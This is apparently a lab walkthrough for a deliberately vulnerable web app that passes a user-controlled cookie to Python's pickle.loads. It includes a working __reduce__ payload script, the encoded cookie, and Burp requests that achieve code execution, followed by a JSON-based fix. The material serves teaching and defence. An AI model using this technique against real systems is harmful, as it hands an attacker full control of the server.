# Walkthrough — deserialization-pickle

The app stores your preferences in a cookie called `prefs`. Under the hood it **serializes** the preferences object with **pickle** — Python's built-in module for turning an object into bytes and rebuilding it later — and base64-encodes the result into the cookie. On every request it reads `prefs`, base64-decodes it, and calls `pickle.loads` on the bytes to rebuild the object. The problem: **you control your own cookie.** And pickle does not store just the object's data — it stores *instructions for rebuilding it*, including which function to call. A forged cookie makes `pickle.loads` run the function you choose: a command on the server.

## 1. Context

On `/` the app shows a "user preferences" page with one line — `Theme: light` — and sets a `prefs` cookie the first time you visit. Every later request reads that cookie back to render your theme. That is the whole feature; there is no form (you don't edit preferences in the UI — the interesting input is the cookie itself).

This is **insecure deserialization**, under **A08 — Software and Data Integrity Failures**. *Serialization* is turning an in-memory object into a string of bytes you can store or send; *deserialization* is the reverse — rebuilding the object from those bytes. The category is about trusting data whose integrity you never verified: here the app takes a cookie the user controls and rebuilds an object from it with a format that can carry *code*, not just *data*.

There is no database and no second service — just the `vulnerable` app on `127.0.0.1:8020` and the `fixed` app on `127.0.0.1:8120`. Exploration is done in Burp, plus a short Python script to build the payload. The proof of code execution is a side effect on the server (a marker file), read with `docker compose exec` — not something you see in the HTTP response.

## 2. Spot the bug

Open [`vulnerable/app.py`](./vulnerable/app.py). The `/` view rebuilds your preferences like this:

```python
cookie = request.cookies.get("prefs")
...
# VULNERABLE: the "prefs" cookie is base64-decoded and passed straight to pickle.loads.
prefs = pickle.loads(base64.b64decode(cookie))  # RCE: attacker bytes -> code on load
theme = prefs["theme"]
```

The bytes fed to `pickle.loads` come straight from your cookie. **pickle** is not a data format like JSON — it is an *object* format: a pickle stream is a little program of opcodes that the unpickler executes to reconstruct an object. Any Python object can define **`__reduce__`**, a hook that tells pickle how to rebuild it — it returns a `(callable, args)` pair meaning "to recreate me, call `callable(*args)`". When `pickle.loads` reaches that, it **calls** the callable. Point `__reduce__` at `os.system` and unpickling *runs a shell command*. Audit question: *these bytes come from my cookie, which I control — and pickle will call whatever function they name?* — yes. The fix (foreshadowed): stop using a format that carries behavior.

The cheap first-pass grep for this class is any deserializer fed untrusted input:

```bash
grep -rn 'pickle.loads\|pickle.load(\|yaml.load(\|jsonpickle' .
```

## 3. Exploitation via Burp Suite

Configure Burp Proxy and point your browser at it. Visit <http://127.0.0.1:8020/> once to capture the traffic, then right-click the `GET /` request in **Proxy → HTTP history** and choose **Send to Repeater**.

### Step 1 — Baseline: see the pickle on the wire

Send the request with no `prefs` cookie (the first visit has none). The response sets one for you:

```
HTTP/1.1 200 OK
Set-Cookie: prefs=gASVFAAAAAAAAAB9lIwFdGhlbWWUjAVsaWdodJRzLg==; Path=/
...
<p>Theme: <strong>light</strong></p>
```

That cookie value is base64. Decode it and look at the bytes — this is the tell that the app uses pickle, not JSON:

```
$ echo 'gASVFAAAAAAAAAB9lIwFdGhlbWWUjAVsaWdodJRzLg==' | base64 -d | python3 -c "import sys; print(sys.stdin.buffer.read())"
b'\x80\x04\x95\x14\x00\x00\x00\x00\x00\x00\x00}\x94\x8c\x05theme\x94\x8c\x05light\x94s.'
```

The leading `\x80\x04` is pickle's `PROTO` opcode (protocol 4) — a pickle stream, not the `{"theme": "light"}` text you'd get from JSON. The app trusts this blob and feeds it to `pickle.loads`. From here you replace it with a pickle of your own.

### Step 2 — Build the payload

pickle calls whatever `__reduce__` returns, so define a throwaway class whose `__reduce__` names `os.system`. This tiny script prints the base64 cookie to send — it is how you'd craft the payload in a real engagement:

```python
import base64, os, pickle

class Exploit:
    def __reduce__(self):
        # to "rebuild" me, pickle will call os.system("touch /tmp/pwned")
        return (os.system, ("touch /tmp/pwned",))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

```
gAWVKwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBB0b3VjaCAvdG1wL3B3bmVklIWUUpQu
```

Building the payload is safe: `pickle.dumps` only *records* the instruction "call `os.system('touch /tmp/pwned')`" into the stream — it does not run it. The command runs on whoever calls `pickle.loads` on these bytes. Disassemble it to see there is nothing malformed — it is perfectly valid pickle:

```
$ python3 -c "import base64, pickletools; pickletools.dis(base64.b64decode('gAWVKwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBB0b3VjaCAvdG1wL3B3bmVklIWUUpQu'))"
    0: \x80 PROTO      5
    2: \x95 FRAME      43
   11: \x8c SHORT_BINUNICODE 'posix'
   19: \x8c SHORT_BINUNICODE 'system'
   28: \x93 STACK_GLOBAL
   30: \x8c SHORT_BINUNICODE 'touch /tmp/pwned'
   49: \x85 TUPLE1
   ...
```

`STACK_GLOBAL` resolves `posix.system` (that is `os.system` on Linux) and the reduce at the end calls it with `"touch /tmp/pwned"`. There is no bug to "sanitize" here — this is well-formed pickle doing exactly what pickle is designed to do.

### Step 3 — Fire it and prove execution

Before you send, confirm the marker does not exist yet:

```
$ docker compose exec vulnerable ls -la /tmp/pwned
ls: cannot access '/tmp/pwned': No such file or directory
```

In Repeater, set the cookie to your payload and send:

```
GET / HTTP/1.1
Host: 127.0.0.1:8020
Cookie: prefs=gAWVKwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBB0b3VjaCAvdG1wL3B3bmVklIWUUpQu
```

The response looks completely ordinary:

```
HTTP/1.1 200 OK
...
<p>Theme: <strong>light</strong></p>
```

`Theme: light`, same as always — **nothing in the response reveals the attack.** That is the nature of deserialization RCE (Remote Code Execution — running arbitrary commands on the server): the command fires *inside* `pickle.loads`, before the app does anything with the result, and the page renders as if nothing happened. The proof is the side effect. Check the server:

```
$ docker compose exec vulnerable ls -la /tmp/pwned
-rw-r--r-- 1 root root 0 Jul 24 18:41 /tmp/pwned
```

The file exists — your cookie made the server run `touch /tmp/pwned`. Swap the command to `id` and it prints to the container's log, showing *who* you run as:

```
$ docker compose logs vulnerable | grep uid
vulnerable-1  | uid=0(root) gid=0(root) groups=0(root)
```

**What this really is.** Here the command runs inside a throwaway, isolated container, so `touch`-ing a file or printing `id` as `root` is harmless — that isolation is the safety net for this lab. On a real target this is full **Remote Code Execution**: arbitrary commands as the server user, on the server's machine. The innocuous `touch`/`id` stands in for complete control of the host. Keep your payloads demonstrative — a marker file, an `id`; there is never a reason to reach for `rm -rf`, a reverse shell, or anything destructive or networked, even in a container.

## 4. What the vuln is NOT

The exploit is a cookie you tampered with, so it is easy to draw the wrong lesson. Isolate the real cause:

- **It is NOT "a tamperable cookie" — signing does not fix it.** The tempting reaction is "sign the cookie with an HMAC so it can't be forged." That raises the bar for *this* delivery (a forged cookie is rejected), but it does not touch the cause: `pickle.loads` on untrusted bytes is still RCE. If the signing key ever leaks (secrets do leak — `ssti-jinja` discloses a Flask `SECRET_KEY` through a template bug) or the bytes reach `loads` by any other path — a cache, a queue, a file — you are back to code execution. The cause is the **format**, not the cookie's authenticity. (Symptom vs. cause — see [`DIFF.md`](./DIFF.md).)
- **It is NOT the same as command injection.** `command-injection-basic` also reaches RCE, but there the app *builds a shell command string* out of your input and a shell parses it (A03 — Injection). Here nothing builds a command — the *deserializer* reconstructs an object and runs the behavior baked into the bytes (A08). Different cause, different class, different fix; only the impact (RCE) is the same.
- **It is NOT a validation / input-sanitizing bug.** The malicious cookie is *valid* pickle (Step 2's disassembly proves it) — there is no malformed input to reject and nothing to "sanitize" out. The format itself executes behavior carried in well-formed data.

The one thing it **is**: `pickle.loads` rebuilds an object *you* forged and calls the function its `__reduce__` names, because the format carries behavior. The only fix is to use a format that carries **data only**.

## 5. Impact

**Remote Code Execution.** The attacker runs arbitrary commands on the server through a single tampered cookie — the top of the severity scale. It is the same ceiling as `command-injection-basic`, reached by a different cause (a deserializer that executes embedded behavior, not a shell parsing a command string). No overclaim: it is RCE as the app's container user (here, `root`), which already means full control of that host.

## 6. Why the fix works

See [`DIFF.md`](./DIFF.md) for the change. The fixed app reads the same cookie but (de)serializes with **JSON** — a data-only format:

```python
prefs = json.loads(base64.b64decode(cookie))  # JSON: data only; no code path on load
```

Its baseline cookie is JSON, not pickle — decode it and you get text with no opcodes to execute:

```
$ echo 'eyJ0aGVtZSI6ICJsaWdodCJ9' | base64 -d
{"theme": "light"}
```

Replay the exploit against <http://127.0.0.1:8120/>: send the *same* malicious pickle cookie, then check the server:

```
$ docker compose exec fixed ls -la /tmp/pwned
ls: cannot access '/tmp/pwned': No such file or directory
```

The marker is never created. `json.loads` on the pickle bytes just raises (they are not valid JSON), the app falls back to the default, and the page still renders `Theme: light`. `json.loads` has no mechanism to call a function — the worst a malicious cookie can produce is an odd dictionary. The whole fix is the format: `pickle` → `json`.

Note what the fix is *not*: it does not validate the cookie, block a byte pattern, or sign it. Signing (an HMAC) is a mitigation worth having in depth — it makes tampering detectable — but it guards an unsafe operation instead of removing it; the root fix is to stop deserializing untrusted data with a format that carries behavior. Python's own `pickle` docs say exactly this: consider HMAC if you need tamper-detection, but "safer serialization formats such as `json` may be more appropriate if you are processing untrusted data."
